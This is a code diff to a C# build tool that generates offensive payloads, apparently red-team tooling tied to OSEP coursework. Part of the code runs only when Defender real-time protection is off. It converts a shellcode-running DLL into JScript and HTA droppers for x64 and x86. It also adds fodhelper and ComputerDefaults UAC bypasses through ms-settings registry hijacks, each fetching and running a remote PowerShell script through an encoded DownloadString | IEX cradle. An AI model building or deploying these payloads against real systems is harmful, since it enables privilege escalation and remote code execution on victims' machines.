@@ -425,21 +425,68 @@ namespace Build
             //DotNetToJsTemplates
             if (!IsDefenderRealTimeProtectionEnabled())
             {
-                Console.WriteLine("*** Starting DotNet 2 Jscript ***");
-                string dn2js_location = $"{args[0]}\\DotNetToJScript\\bin\\x64\\DotNetToJScript.exe";
-                string dll_location = $"{args[0]}\\ARTIFACTS\\Fundamental\\DLL invoke Shellcode\\x64\\invoke-sc.dll";
-                string out_location = $"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable.js";
-                string cmdline = $"{dn2js_location} \"{dll_location}\" --lang=Jscript --ver=v4 -o \"{out_location}\" -c OSEP.OSEPRunner";
-                Console.WriteLine(cmdline);
-                RunProccess(cmdline);
+                
 
+                //x64 dotnet2js
+                try
+                {
+                    Console.WriteLine("***  Starting DotNet 2 Jscript X64  ***");
+                    string dn2js_location = $"{args[0]}\\DotNetToJScript\\bin\\x64\\DotNetToJScript.exe";
+                    string dll_location = $"{args[0]}\\ARTIFACTS\\Fundamental\\DLL invoke Shellcode\\x64\\invoke-sc.dll";
+                    string out_location = $"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable_x64.js";
+                    string cmdline = $"{dn2js_location} \"{dll_location}\" --lang=Jscript --ver=v4 -o \"{out_location}\" -c OSEP.OSEPRunner";
+                    Console.WriteLine(cmdline);
+                    RunProccess(cmdline);
+                }
+                catch
+                {
 
+                }
 
-                //build hta files
-                string js = File.ReadAllText($"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable.js");
-                string tmp = File.ReadAllText($"{args[0]}\\templates\\invoke_dll.hta");
-                string result = tmp.Replace("{JSCODE}", js);
-                File.WriteAllText($"{args[0]}\\ARTIFACTS\\scripts\\invoke_dll.hta",result);
+                try
+                {
+                    Console.WriteLine("***  Starting DotNet 2 Jscript X86  ***");
+                    string dn2js_location = $"{args[0]}\\DotNetToJScript\\bin\\x64\\DotNetToJScript.exe";
+                    string dll_location = $"{args[0]}\\ARTIFACTS\\Fundamental\\DLL invoke Shellcode\\x86\\invoke-sc.dll";
+                    string out_location = $"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable_x86.js";
+                    string cmdline = $"{dn2js_location} \"{dll_location}\" --lang=Jscript --ver=v4 -o \"{out_location}\" -c OSEP.OSEPRunner";
+                    Console.WriteLine(cmdline);
+                    RunProccess(cmdline);
+                }
+                catch
+                {
+
+                }
+
+                try
+                {
+                    //build hta files
+                    Console.WriteLine("*** Starting HTA X64 ***");
+                    string js = File.ReadAllText($"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable_x64.js");
+                    string tmp = File.ReadAllText($"{args[0]}\\templates\\invoke_dll.hta");
+                    string result = tmp.Replace("{JSCODE}", js);
+                    File.WriteAllText($"{args[0]}\\ARTIFACTS\\scripts\\invoke_dll_x64.hta", result);
+                }
+                catch
+                {
+
+                }
+
+                try
+                {
+                    //build hta files
+                    Console.WriteLine("*** Starting HTA X86 ***");
+                    string js = File.ReadAllText($"{args[0]}\\ARTIFACTS\\scripts\\rundll_invokable_x86.js");
+                    string tmp = File.ReadAllText($"{args[0]}\\templates\\invoke_dll.hta");
+                    string result = tmp.Replace("{JSCODE}", js);
+                    File.WriteAllText($"{args[0]}\\ARTIFACTS\\scripts\\invoke_dll_x86.hta", result);
+                }
+                catch
+                {
+
+                }
+
+                
             }
             else
             {
@@ -666,8 +713,30 @@ namespace Build
                 output = output.Replace("{ENC_CALLBACK_PYTHON}", cb.Replace("XXX", Convert.ToBase64String(Encoding.UTF8.GetBytes(cbpy))));
                 output = output.Replace("{ENC_CALLBACK_BASH}", cb.Replace("XXX", Convert.ToBase64String(Encoding.UTF8.GetBytes(cbsh))));
 
+                //UAC Bypasses
+                string uaccb = $"(New-Object System.Net.WebClient).DownloadString('{CONFIG.HTTP_URL}/{CONFIG.POWERSHELL_SCRIPT_NAME}') | IEX";
+
+                string cd001 = @"New-Item ""HKCU:\software\classes\ms-settings\shell\open\command"" -Force";
+                string cd002 = @"New-ItemProperty ""HKCU:\software\classes\ms-settings\shell\open\command"" -Name ""DelegateExecute"" -Value """" -Force";
+                string cd003 = $"execute -o powershell 'Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe /c powershell -enc {Convert.ToBase64String(Encoding.Unicode.GetBytes(uaccb))}\" -Force'";
+
+                StringBuilder cdsb = new StringBuilder();
+                cdsb.AppendLine($"sharpsh -- -e -c {Convert.ToBase64String(Encoding.UTF8.GetBytes(cd001))}");
+                cdsb.AppendLine($"sharpsh -- -e -c {Convert.ToBase64String(Encoding.UTF8.GetBytes(cd002))}");
+                cdsb.AppendLine($"{cd003}");
+                cdsb.AppendLine(@"execute -o powershell 'Start-Process ""C:\Windows\System32\ComputerDefaults.exe""'");
+                output = output.Replace("{UAC_COMPUTER_DEFAULTS}", cdsb.ToString());
 
 
+
+                string fod001 = $"New-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Value \"powershell.exe {uaccb}\" -Force";
+                string fod002 = @"New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force";
+
+                StringBuilder fhsb = new StringBuilder();
+                fhsb.AppendLine($"sharpsh -- -e -c {Convert.ToBase64String(Encoding.UTF8.GetBytes(fod001))}");
+                fhsb.AppendLine($"sharpsh -- -e -c {Convert.ToBase64String(Encoding.UTF8.GetBytes(fod002))}");
+                fhsb.AppendLine(@"execute -o powershell 'Start-Process ""C:\Windows\System32\fodhelper.exe""'");
+                output = output.Replace("{UAC_FODHELPER}", fhsb.ToString());
             }
 
 
